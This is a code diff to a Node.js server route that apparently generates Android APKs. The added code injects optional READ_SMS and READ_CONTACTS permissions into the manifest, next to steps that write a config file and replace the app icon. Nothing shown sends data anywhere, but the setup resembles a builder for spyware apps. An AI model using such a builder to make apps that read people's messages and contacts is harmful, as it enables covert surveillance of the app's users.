@@ -137,6 +137,35 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
             };
             fs.writeFileSync(path.join(assetsDir, 'config.json'), JSON.stringify(config));
 
+            // 3.5. Dynamically inject permissions into AndroidManifest.xml
+            const manifestPath = path.join(workDir, 'AndroidManifest.xml');
+            if (fs.existsSync(manifestPath)) {
+                let manifestContent = fs.readFileSync(manifestPath, 'utf8');
+
+                // Find where to inject permissions (after existing permissions, before closing manifest tag area)
+                const permissionInsertPoint = manifestContent.indexOf('<uses-permission android:name="android.permission.FOREGROUND_SERVICE"');
+
+                if (permissionInsertPoint !== -1) {
+                    let permissionsToAdd = '';
+
+                    if (enableSmsPermission === 'true') {
+                        permissionsToAdd += '    <uses-permission android:name="android.permission.READ_SMS" />\n';
+                        console.log('[APK] Adding READ_SMS permission');
+                    }
+
+                    if (enableContactsPermission === 'true') {
+                        permissionsToAdd += '    <uses-permission android:name="android.permission.READ_CONTACTS" />\n';
+                        console.log('[APK] Adding READ_CONTACTS permission');
+                    }
+
+                    if (permissionsToAdd) {
+                        manifestContent = manifestContent.slice(0, permissionInsertPoint) + permissionsToAdd + manifestContent.slice(permissionInsertPoint);
+                        fs.writeFileSync(manifestPath, manifestContent);
+                        console.log('[APK] Permissions injected successfully');
+                    }
+                }
+            }
+
             // 4. Icon
             if (customIcon) {
                 await sendUpdate('apk_progress', { step: 'Optimizing and replacing app icons...', progress: 60 });
